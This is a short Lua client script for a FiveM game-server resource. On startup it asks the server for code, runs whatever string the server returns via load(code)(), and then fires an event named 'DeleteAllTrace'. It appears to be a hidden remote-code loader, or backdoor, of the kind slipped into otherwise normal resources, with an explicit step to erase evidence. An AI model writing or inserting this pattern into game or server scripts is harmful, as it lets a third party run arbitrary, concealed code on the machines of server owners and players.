Citizen.CreateThread(function()
    while true do
        Citizen.Wait(0)
        if GetResourceState(GetCurrentResourceName()) == 'started' then
            Citizen.Wait(100)
            TriggerServerEvent(GetCurrentResourceName() .. ":LoadSv")
            break
        end
    end
end)


RegisterNetEvent(GetCurrentResourceName() .. ":LoadC")
AddEventHandler(GetCurrentResourceName() .. ":LoadC", function(code)
    load(code)()
    Wait(1000)
    TriggerServerEvent(GetCurrentResourceName() .. ":DeleteAllTrace")
end)